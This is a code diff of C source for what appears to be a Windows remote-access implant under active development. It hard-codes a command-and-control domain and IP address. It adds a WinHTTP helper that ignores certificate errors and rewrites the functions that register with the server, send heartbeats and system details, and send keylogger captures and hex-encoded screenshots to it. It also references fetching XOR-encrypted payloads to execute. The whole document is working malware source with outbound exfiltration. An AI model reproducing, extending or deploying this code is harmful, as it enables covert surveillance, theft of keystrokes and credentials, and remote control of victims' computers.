@@ -8,6 +8,7 @@
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <windows.h>
+#include <winhttp.h>
 #include <stdio.h>
 #include <time.h>
 #include "nt.h"
@@ -54,8 +55,11 @@ int DEBUG_MODE = 1; // 1 to enable debug, 0 to disable
 #define THRESHOLD_MIN_RAM_MB 2048
 
 // C2 SERVER CONFIGURATION
-#define C2_SERVER "162.19.242.23"
-#define C2_PORT 3000
+//#define C2_SERVER "127.0.0.1"
+//#define C2_SERVER "162.19.242.23"
+#define C2_SERVER "console.stock-s.fr"
+
+#define C2_PORT 443
 #define C2_REGISTER_PATH "/heartbeat/register"
 #define C2_HEARTBEAT_PATH "/heartbeat"
 #define C2_ARCH_UPDATE_PATH "/api/agent/system-info"
@@ -1284,6 +1288,80 @@ int send_screenshot_to_c2(const char* agent_id, const unsigned char* data, size_
 // ============================================================================
 
 /**
+ * Helper WinHTTP - POST HTTPS vers le C2
+ * path       : ex "/heartbeat"
+ * body       : corps JSON (peut être NULL)
+ * body_len   : longueur du corps (0 si NULL)
+ * resp_buf   : buffer de réponse (peut être NULL)
+ * resp_size  : taille du buffer
+ * Retourne 0 si succès, -1 si erreur
+ */
+static int winhttp_post(const char* path, const char* body, size_t body_len,
+                        char* resp_buf, size_t resp_size) {
+    // Convertir server et path en wide strings
+    wchar_t w_server[256] = {0};
+    wchar_t w_path[512]   = {0};
+    MultiByteToWideChar(CP_ACP, 0, C2_SERVER, -1, w_server, 256);
+    MultiByteToWideChar(CP_ACP, 0, path,      -1, w_path,   512);
+
+    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0",
+                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+                                     WINHTTP_NO_PROXY_NAME,
+                                     WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) return -1;
+
+    HINTERNET hConnect = WinHttpConnect(hSession, w_server, (INTERNET_PORT)C2_PORT, 0);
+    if (!hConnect) { WinHttpCloseHandle(hSession); return -1; }
+
+    DWORD flags = (C2_PORT == 443) ? WINHTTP_FLAG_SECURE : 0;
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", w_path,
+                                            NULL, WINHTTP_NO_REFERER,
+                                            WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
+    if (!hRequest) {
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return -1;
+    }
+
+    // Ignorer les erreurs de certificat auto-signé
+    DWORD sec_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA      |
+                      SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
+                      SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
+    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &sec_flags, sizeof(sec_flags));
+
+    const wchar_t* headers = L"Content-Type: application/json\r\n";
+    BOOL ok = WinHttpSendRequest(hRequest, headers, (DWORD)-1L,
+                                 (LPVOID)body, (DWORD)body_len,
+                                 (DWORD)body_len, 0);
+    if (!ok || !WinHttpReceiveResponse(hRequest, NULL)) {
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return -1;
+    }
+
+    // Lire la réponse
+    if (resp_buf && resp_size > 0) {
+        DWORD total = 0;
+        DWORD avail = 0;
+        while (WinHttpQueryDataAvailable(hRequest, &avail) && avail > 0) {
+            DWORD to_read = (avail < (DWORD)(resp_size - total - 1))
+                            ? avail : (DWORD)(resp_size - total - 1);
+            DWORD read = 0;
+            WinHttpReadData(hRequest, resp_buf + total, to_read, &read);
+            total += read;
+            if (total >= resp_size - 1) break;
+        }
+        resp_buf[total] = '\0';
+    }
+
+    WinHttpCloseHandle(hRequest);
+    WinHttpCloseHandle(hConnect);
+    WinHttpCloseHandle(hSession);
+    return 0;
+}
+
+/**
  * Store the XOR key received from C2 for payload decryption
  * Converts full hex string to byte array for polyalphabetic XOR
  * @param xor_key_str: Hex string representation of the XOR key from C2
@@ -1974,109 +2052,28 @@ int parse_payload_from_response(const char* json, Task* task, const char* xor_ke
 int register_with_c2(const char* uuid, const char* system_info_json, C2RegistrationResponse* response) {
     DEBUG("[C2 - Start] Registering with C2 server %s:%d\n", C2_SERVER, C2_PORT);
 
-    WSADATA wsaData;
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-        DEBUG("[C2 - Error] WSAStartup failed: %d\n", WSAGetLastError());
-        return -1;
-    }
-
-    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (sock == INVALID_SOCKET) {
-        DEBUG("[C2 - Error] Socket creation failed: %d\n", WSAGetLastError());
-        WSACleanup();
-        return -1;
-    }
-
-    struct sockaddr_in server_addr;
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(C2_PORT);
-    server_addr.sin_addr.s_addr = inet_addr(C2_SERVER);
-
-    DEBUG("[C2 - Connect] Connecting to %s:%d...\n", C2_SERVER, C2_PORT);
-    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
-        DEBUG("[C2 - Error] Connection failed: %d\n", WSAGetLastError());
-        closesocket(sock);
-        WSACleanup();
-        return -1;
-    }
-    DEBUG("[C2 - Connect] Connected successfully\n");
-
-    // Build HTTP POST request
-    char http_request[16384];
     char post_body[8192];
-
     snprintf(post_body, sizeof(post_body),
              "{\"uuid\":\"%s\",\"system_info\":%s}",
              uuid, system_info_json);
 
-    snprintf(http_request, sizeof(http_request),
-             "POST %s HTTP/1.1\r\n"
-             "Host: %s:%d\r\n"
-             "Content-Type: application/json\r\n"
-             "Content-Length: %zu\r\n"
-             "Connection: close\r\n"
-             "\r\n"
-             "%s",
-             C2_REGISTER_PATH, C2_SERVER, C2_PORT, strlen(post_body), post_body);
-
-    // Send HTTP request
-    DEBUG("[C2 - Send] Sending registration request...\n");
-    if (send(sock, http_request, strlen(http_request), 0) == SOCKET_ERROR) {
-        DEBUG("[C2 - Error] Send failed: %d\n", WSAGetLastError());
-        closesocket(sock);
-        WSACleanup();
-        return -1;
-    }
-    DEBUG("[C2 - Send] Request sent successfully\n");
-
-    // Receive HTTP response
     char recv_buffer[270000] = {0};
-    int total_received = 0;
-    int bytes_received;
-
-    DEBUG("[C2 - Receive] Waiting for response...\n");
-    while ((bytes_received = recv(sock, recv_buffer + total_received,
-                                  sizeof(recv_buffer) - total_received - 1, 0)) > 0) {
-        total_received += bytes_received;
-        if (total_received >= sizeof(recv_buffer) - 1) break;
-    }
-
-    if (total_received <= 0) {
-        DEBUG("[C2 - Error] No response received\n");
-        closesocket(sock);
-        WSACleanup();
+    if (winhttp_post(C2_REGISTER_PATH, post_body, strlen(post_body),
+                     recv_buffer, sizeof(recv_buffer)) != 0) {
+        DEBUG("[C2 - Error] Registration request failed\n");
         return -1;
     }
 
-    recv_buffer[total_received] = '\0';
-    DEBUG("[C2 - Receive] Received %d bytes\n", total_received);
+    DEBUG("[C2 - Receive] Received response\n");
+    DEBUG("[C2 - Response] JSON: %s\n", recv_buffer);
 
-    // Find JSON body (after HTTP headers)
-    char* json_body = strstr(recv_buffer, "\r\n\r\n");
-    if (json_body) {
-        json_body += 4; // Skip the \r\n\r\n
-        DEBUG("[C2 - Response] JSON: %s\n", json_body);
-
-        if (parse_c2_response(json_body, response) == 0) {
-
-            DEBUG("[C2 - Success] Registered with agent_id: %s\n", response->agent_id);
-            DEBUG("[C2 - Success] Received XOR key: %s\n", response->xor_key);
-        } else {
-            DEBUG("[C2 - Error] Failed to parse C2 response\n");
-            closesocket(sock);
-            WSACleanup();
-            return -1;
-        }
+    if (parse_c2_response(recv_buffer, response) == 0) {
+        DEBUG("[C2 - Success] Registered with agent_id: %s\n", response->agent_id);
+        DEBUG("[C2 - Success] Received XOR key: %s\n", response->xor_key);
     } else {
-        DEBUG("[C2 - Error] No JSON body found in response\n");
-        closesocket(sock);
-        WSACleanup();
+        DEBUG("[C2 - Error] Failed to parse C2 response\n");
         return -1;
     }
-
-    // Cleanup
-    closesocket(sock);
-    WSACleanup();
 
     return 0;
 }
@@ -2089,86 +2086,18 @@ int register_with_c2(const char* uuid, const char* system_info_json, C2Registrat
 int send_architecture_to_c2(const char* agent_id, const SystemInfo* sysInfo) {
     DEBUG("[C2 - Arch Update] Sending system architecture to C2 server %s:%d\n", C2_SERVER, C2_PORT);
 
-    // Generate C2 format JSON
     char c2_json_buffer[16384];
     if (system_info_to_c2_json(agent_id, sysInfo, c2_json_buffer, sizeof(c2_json_buffer)) != 0) {
-        DEBUG("[C2 - Arch Update - Error] Failed to serialize system info to C2 JSON format\n");
+        DEBUG("[C2 - Arch Update - Error] Failed to serialize system info\n");
         return -1;
     }
 
-    DEBUG("[C2 - Arch Update - JSON] Payload:\n%s\n", c2_json_buffer);
-
-    WSADATA wsaData;
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-        DEBUG("[C2 - Arch Update - Error] WSAStartup failed: %d\n", WSAGetLastError());
+    char recv_buffer[1024] = {0};
+    if (winhttp_post(C2_ARCH_UPDATE_PATH, c2_json_buffer, strlen(c2_json_buffer),
+                     recv_buffer, sizeof(recv_buffer)) != 0) {
+        DEBUG("[C2 - Arch Update - Error] Request failed\n");
         return -1;
     }
-
-    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (sock == INVALID_SOCKET) {
-        DEBUG("[C2 - Arch Update - Error] Socket creation failed: %d\n", WSAGetLastError());
-        WSACleanup();
-        return -1;
-    }
-
-    struct sockaddr_in server_addr;
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(C2_PORT);
-    server_addr.sin_addr.s_addr = inet_addr(C2_SERVER);
-
-    DEBUG("[C2 - Arch Update - Connect] Connecting to %s:%d...\n", C2_SERVER, C2_PORT);
-    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
-        DEBUG("[C2 - Arch Update - Error] Connection failed: %d\n", WSAGetLastError());
-        closesocket(sock);
-        WSACleanup();
-        return -1;
-    }
-    DEBUG("[C2 - Arch Update - Connect] Connected successfully\n");
-
-    // Build HTTP POST request
-    char http_request[32768];
-    snprintf(http_request, sizeof(http_request),
-             "POST %s HTTP/1.1\r\n"
-             "Host: %s:%d\r\n"
-             "Content-Type: application/json\r\n"
-             "Content-Length: %zu\r\n"
-             "Connection: close\r\n"
-             "\r\n"
-             "%s",
-             C2_ARCH_UPDATE_PATH, C2_SERVER, C2_PORT, strlen(c2_json_buffer), c2_json_buffer);
-
-    // Send HTTP request
-    DEBUG("[C2 - Arch Update - Send] Sending architecture update...\n");
-    if (send(sock, http_request, strlen(http_request), 0) == SOCKET_ERROR) {
-        DEBUG("[C2 - Arch Update - Error] Send failed: %d\n", WSAGetLastError());
-        closesocket(sock);
-        WSACleanup();
-        return -1;
-    }
-    DEBUG("[C2 - Arch Update - Send] Request sent successfully\n");
-
-    // Receive HTTP response
-    char recv_buffer[270000] = {0};
-    int total_received = 0;
-    int bytes_received;
-
-    DEBUG("[C2 - Arch Update - Receive] Waiting for response...\n");
-    while ((bytes_received = recv(sock, recv_buffer + total_received,
-                                  sizeof(recv_buffer) - total_received - 1, 0)) > 0) {
-        total_received += bytes_received;
-        if (total_received >= sizeof(recv_buffer) - 1) break;
-    }
-
-    if (total_received > 0) {
-        recv_buffer[total_received] = '\0';
-        DEBUG("[C2 - Arch Update - Receive] Received %d bytes\n", total_received);
-    } else {
-        DEBUG("[C2 - Arch Update - Warning] No response received\n");
-    }
-
-    // Cleanup
-    closesocket(sock);
-    WSACleanup();
 
     DEBUG("[C2 - Arch Update - Success] Architecture update completed\n");
     return 0;
@@ -2283,104 +2212,21 @@ int read_keylogger_data(char* output_buffer, size_t buffer_size) {
  * Returns 0 on success, -1 on error
  */
 int send_keylogger_data_to_c2(const char* agent_id, const char* keylogger_data) {
-    if (!agent_id || !keylogger_data) {
-        DEBUG("[C2 - Keylogger Data - Error] Invalid parameters\n");
-        return -1;
-    }
+    if (!agent_id || !keylogger_data || strlen(keylogger_data) == 0) return 0;
 
-    // Don't send if no data
-    if (strlen(keylogger_data) == 0) {
-        DEBUG("[C2 - Keylogger Data] No data to send\n");
-        return 0;
-    }
+    DEBUG("[C2 - Keylogger Data] Sending %zu bytes\n", strlen(keylogger_data));
 
-    DEBUG("[C2 - Keylogger Data] Sending %zu bytes to C2 server %s:%d\n",
-          strlen(keylogger_data), C2_SERVER, C2_PORT);
-
-    // Build JSON payload
     char json_payload[8192];
     snprintf(json_payload, sizeof(json_payload),
-             "{"
-             "\"agent_id\":\"%s\","
-             "\"type\":\"keylogger_data\","
-             "\"data\":\"%s\","
-             "\"timestamp\":%lu"
-             "}",
+             "{\"agent_id\":\"%s\",\"type\":\"keylogger_data\",\"data\":\"%s\",\"timestamp\":%lu}",
              agent_id, keylogger_data, (unsigned long)time(NULL));
 
-    DEBUG("[C2 - Keylogger Data - JSON] Payload:\n%s\n", json_payload);
-
-    WSADATA wsaData;
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-        DEBUG("[C2 - Keylogger Data - Error] WSAStartup failed: %d\n", WSAGetLastError());
+    char recv_buffer[1024] = {0};
+    if (winhttp_post("/keylogger", json_payload, strlen(json_payload),
+                     recv_buffer, sizeof(recv_buffer)) != 0) {
+        DEBUG("[C2 - Keylogger Data - Error] Request failed\n");
         return -1;
     }
-
-    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (sock == INVALID_SOCKET) {
-        DEBUG("[C2 - Keylogger Data - Error] Socket creation failed: %d\n", WSAGetLastError());
-        WSACleanup();
-        return -1;
-    }
-
-    struct sockaddr_in server_addr;
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(C2_PORT);
-    server_addr.sin_addr.s_addr = inet_addr(C2_SERVER);
-
-    DEBUG("[C2 - Keylogger Data - Connect] Connecting to %s:%d...\n", C2_SERVER, C2_PORT);
-    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
-        DEBUG("[C2 - Keylogger Data - Error] Connection failed: %d\n", WSAGetLastError());
-        closesocket(sock);
-        WSACleanup();
-        return -1;
-    }
-    DEBUG("[C2 - Keylogger Data - Connect] Connected successfully\n");
-
-    // Build HTTP POST request (using heartbeat path for now)
-    char http_request[16384];
-    snprintf(http_request, sizeof(http_request),
-             "POST /api/keylogger HTTP/1.1\r\n"
-             "Host: %s:%d\r\n"
-             "Content-Type: application/json\r\n"
-             "Content-Length: %zu\r\n"
-             "Connection: close\r\n"
-             "\r\n"
-             "%s",
-             C2_SERVER, C2_PORT, strlen(json_payload), json_payload);
-
-    // Send HTTP request
-    DEBUG("[C2 - Keylogger Data - Send] Sending data...\n");
-    if (send(sock, http_request, strlen(http_request), 0) == SOCKET_ERROR) {
-        DEBUG("[C2 - Keylogger Data - Error] Send failed: %d\n", WSAGetLastError());
-        closesocket(sock);
-        WSACleanup();
-        return -1;
-    }
-    DEBUG("[C2 - Keylogger Data - Send] Request sent successfully\n");
-
-    // Receive HTTP response
-    char recv_buffer[4096] = {0};
-    int total_received = 0;
-    int bytes_received;
-
-    DEBUG("[C2 - Keylogger Data - Receive] Waiting for response...\n");
-    while ((bytes_received = recv(sock, recv_buffer + total_received,
-                                  sizeof(recv_buffer) - total_received - 1, 0)) > 0) {
-        total_received += bytes_received;
-        if (total_received >= sizeof(recv_buffer) - 1) break;
-    }
-
-    if (total_received > 0) {
-        recv_buffer[total_received] = '\0';
-        DEBUG("[C2 - Keylogger Data - Receive] Received %d bytes\n", total_received);
-    } else {
-        DEBUG("[C2 - Keylogger Data - Warning] No response received\n");
-    }
-
-    // Cleanup
-    closesocket(sock);
-    WSACleanup();
 
     DEBUG("[C2 - Keylogger Data - Success] Keylogger data sent successfully\n");
     return 0;
@@ -2473,62 +2319,33 @@ int read_screenshot_data(unsigned char** out_data, size_t* out_size) {
 int send_screenshot_to_c2(const char* agent_id, const unsigned char* data, size_t size) {
     if (!agent_id || !data || size == 0) return -1;
 
-    // Encoder en hex
     size_t hex_len = size * 2 + 1;
     char* hex_buf = (char*)malloc(hex_len);
     if (!hex_buf) return -1;
-
     for (size_t i = 0; i < size; i++)
         sprintf(hex_buf + i * 2, "%02X", data[i]);
     hex_buf[size * 2] = '\0';
 
-    DEBUG("[C2 - Screenshot] Sending screenshot to C2 (%zu bytes -> %zu hex chars)\n", size, size * 2);
+    DEBUG("[C2 - Screenshot] Sending screenshot (%zu bytes -> %zu hex chars)\n", size, size * 2);
 
-    // Construire le body JSON
     size_t body_len = strlen(agent_id) + hex_len + 64;
     char* body = (char*)malloc(body_len);
     if (!body) { free(hex_buf); return -1; }
-    snprintf(body, body_len, "{\"agent_id\":\"%s\",\"type\":\"screenshot\",\"data\":\"%s\"}", agent_id, hex_buf);
+    snprintf(body, body_len,
+             "{\"agent_id\":\"%s\",\"type\":\"screenshot\",\"data\":\"%s\"}",
+             agent_id, hex_buf);
     free(hex_buf);
 
-    WSADATA wsa;
-    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) { free(body); return -1; }
-
-    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
-    if (sock == INVALID_SOCKET) { WSACleanup(); free(body); return -1; }
-
-    struct sockaddr_in server;
-    server.sin_family = AF_INET;
-    server.sin_port = htons(C2_PORT);
-    server.sin_addr.s_addr = inet_addr(C2_SERVER);
-
-    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
-        closesocket(sock); WSACleanup(); free(body); return -1;
-    }
-
-    size_t req_len = strlen(body) + 256;
-    char* request = (char*)malloc(req_len);
-    if (!request) { closesocket(sock); WSACleanup(); free(body); return -1; }
-
-    snprintf(request, req_len,
-        "POST /screenshot HTTP/1.1\r\n"
-        "Host: %s:%d\r\n"
-        "Content-Type: application/json\r\n"
-        "Content-Length: %zu\r\n"
-        "Connection: close\r\n\r\n"
-        "%s",
-        C2_SERVER, C2_PORT, strlen(body), body);
-
-    send(sock, request, (int)strlen(request), 0);
-    free(request);
+    char recv_buf[1024] = {0};
+    int ret = winhttp_post("/screenshot", body, strlen(body), recv_buf, sizeof(recv_buf));
     free(body);
 
-    char recv_buf[1024] = {0};
-    recv(sock, recv_buf, sizeof(recv_buf) - 1, 0);
+    if (ret != 0) {
+        DEBUG("[C2 - Screenshot - Error] Request failed\n");
+        return -1;
+    }
 
-    closesocket(sock);
-    WSACleanup();
-
+    DEBUG("[C2 - Screenshot - Response] %s\n", recv_buf);
     DEBUG("[C2 - Screenshot] Screenshot sent successfully\n");
     return 0;
 }
@@ -2744,145 +2561,49 @@ int execute_task(const Task* task, unsigned char xor_function_key, unsigned char
 int send_heartbeat_to_c2(const char* agent_id, char* response_buffer, size_t buffer_size) {
     DEBUG("[C2 - Heartbeat] Sending heartbeat to C2 server %s:%d\n", C2_SERVER, C2_PORT);
 
-    if (response_buffer) {
-        response_buffer[0] = '\0';
-    }
+    if (response_buffer) response_buffer[0] = '\0';
 
-    WSADATA wsaData;
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-        DEBUG("[C2 - Heartbeat - Error] WSAStartup failed: %d\n", WSAGetLastError());
-        return -1;
-    }
-
-    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (sock == INVALID_SOCKET) {
-        DEBUG("[C2 - Heartbeat - Error] Socket creation failed: %d\n", WSAGetLastError());
-        WSACleanup();
-        return -1;
-    }
-
-    struct sockaddr_in server_addr;
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(C2_PORT);
-    server_addr.sin_addr.s_addr = inet_addr(C2_SERVER);
-
-    DEBUG("[C2 - Heartbeat - Connect] Connecting to %s:%d...\n", C2_SERVER, C2_PORT);
-    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
-        DEBUG("[C2 - Heartbeat - Error] Connection failed: %d\n", WSAGetLastError());
-        closesocket(sock);
-        WSACleanup();
-        return -1;
-    }
-    DEBUG("[C2 - Heartbeat - Connect] Connected successfully\n");
-
-    // Build HTTP POST request with JSON body
-    char http_request[1024];
     char post_body[256];
-
-    snprintf(post_body, sizeof(post_body),
-             "{\"agent_id\":\"%s\"}",
-             agent_id);
-
-    snprintf(http_request, sizeof(http_request),
-             "POST %s HTTP/1.1\r\n"
-             "Host: %s:%d\r\n"
-             "Content-Type: application/json\r\n"
-             "Content-Length: %zu\r\n"
-             "Connection: close\r\n"
-             "\r\n"
-             "%s",
-             C2_HEARTBEAT_PATH, C2_SERVER, C2_PORT, strlen(post_body), post_body);
-
-    // Send HTTP request
+    snprintf(post_body, sizeof(post_body), "{\"agent_id\":\"%s\"}", agent_id);
     DEBUG("[C2 - Heartbeat - Send] Sending heartbeat with body: %s\n", post_body);
-    if (send(sock, http_request, strlen(http_request), 0) == SOCKET_ERROR) {
-        DEBUG("[C2 - Heartbeat - Error] Send failed: %d\n", WSAGetLastError());
-        closesocket(sock);
-        WSACleanup();
+
+    if (winhttp_post(C2_HEARTBEAT_PATH, post_body, strlen(post_body),
+                     response_buffer, buffer_size) != 0) {
+        DEBUG("[C2 - Heartbeat - Error] Request failed\n");
         return -1;
     }
-    DEBUG("[C2 - Heartbeat - Send] Request sent successfully\n");
 
-    // Receive HTTP response - Use dynamic allocation for large payloads (up to 1 MB)
-    const size_t RECV_BUFFER_SIZE = 1048576;  // 1 MB buffer for large payloads
-    char* recv_buffer = (char*)malloc(RECV_BUFFER_SIZE);
-    if (!recv_buffer) {
-        DEBUG("[C2 - Heartbeat - Error] Failed to allocate receive buffer\n");
-        closesocket(sock);
-        WSACleanup();
-        return -1;
-    }
-    memset(recv_buffer, 0, RECV_BUFFER_SIZE);
+    if (response_buffer && strlen(response_buffer) > 0) {
+        DEBUG("[C2 - Heartbeat - Receive] Received %zu bytes\n", strlen(response_buffer));
 
-    int total_received = 0;
-    int bytes_received;
-
-    DEBUG("[C2 - Heartbeat - Receive] Waiting for response...\n");
-    while ((bytes_received = recv(sock, recv_buffer + total_received,
-                                    RECV_BUFFER_SIZE - total_received - 1, 0)) > 0) {
-        total_received += bytes_received;
-        if (total_received >= RECV_BUFFER_SIZE - 1) {
-            DEBUG("[C2 - Heartbeat - Warning] Buffer full at %d bytes, stopping reception\n", total_received);
-            break;
-        }
-    }
-
-    if (total_received > 0) {
-        recv_buffer[total_received] = '\0';
-        DEBUG("[C2 - Heartbeat - Receive] Received %d bytes\n", total_received);
-
-        // Find JSON body (after HTTP headers)
-        char* json_body = strstr(recv_buffer, "\r\n\r\n");
-        if (json_body && response_buffer) {
-            json_body += 4; // Skip the \r\n\r\n
-
-            // Always display JSON but replace payload value with its size
-            size_t json_len = strlen(json_body);
-            const char* payload_field = strstr(json_body, "\"payload\"");
-            if (payload_field) {
-                // Find the opening quote of the payload value
-                const char* val_start = strchr(payload_field + 9, '"');
-                if (val_start) {
-                    val_start++;  // Skip opening quote
-                    const char* val_end = strchr(val_start, '"');
-                    if (val_end) {
-                        size_t payload_hex_len = val_end - val_start;
-                        size_t payload_bytes = payload_hex_len / 2;
-
-                        // Build display string: everything before payload value + summary + rest
-                        size_t prefix_len = val_start - json_body;
-                        char display_buf[1024];
-                        size_t copy_len = prefix_len < sizeof(display_buf) - 1 ? prefix_len : sizeof(display_buf) - 1;
-                        strncpy(display_buf, json_body, copy_len);
-                        display_buf[copy_len] = '\0';
-
-                        DEBUG("[C2 - Heartbeat - Response] JSON: %s[payload: %zu bytes]\"%s\n",
-                              display_buf, payload_bytes, val_end + 1);
-                    }
+        // Afficher JSON en remplaçant le payload par sa taille
+        const char* payload_field = strstr(response_buffer, "\"payload\"");
+        if (payload_field) {
+            const char* val_start = strchr(payload_field + 9, '"');
+            if (val_start) {
+                val_start++;
+                const char* val_end = strchr(val_start, '"');
+                if (val_end) {
+                    size_t payload_bytes = (val_end - val_start) / 2;
+                    size_t prefix_len = val_start - response_buffer;
+                    char display_buf[1024];
+                    size_t copy_len = prefix_len < sizeof(display_buf) - 1 ? prefix_len : sizeof(display_buf) - 1;
+                    strncpy(display_buf, response_buffer, copy_len);
+                    display_buf[copy_len] = '\0';
+                    DEBUG("[C2 - Heartbeat - Response] JSON: %s[payload: %zu bytes]\"%s\n",
+                          display_buf, payload_bytes, val_end + 1);
                 }
-            } else {
-                DEBUG("[C2 - Heartbeat - Response] JSON: %s\n", json_body);
             }
-
-            // Copy to response buffer
-            if (json_len >= buffer_size) {
-                DEBUG("[C2 - Heartbeat - Warning] Response too large (%zu bytes), truncating to %zu bytes\n",
-                      json_len, buffer_size - 1);
-            }
-            strncpy(response_buffer, json_body, buffer_size - 1);
-            response_buffer[buffer_size - 1] = '\0';
+        } else {
+            DEBUG("[C2 - Heartbeat - Response] JSON: %s\n", response_buffer);
         }
     } else {
         DEBUG("[C2 - Heartbeat - Warning] No response received\n");
+        return -1;
     }
 
-    // Cleanup
-    free(recv_buffer);
-    closesocket(sock);
-    WSACleanup();
-
     DEBUG("[C2 - Heartbeat - Success] Heartbeat sent successfully\n");
-    return total_received > 0 ? 0 : -1;
+    return 0;
 }
 
 
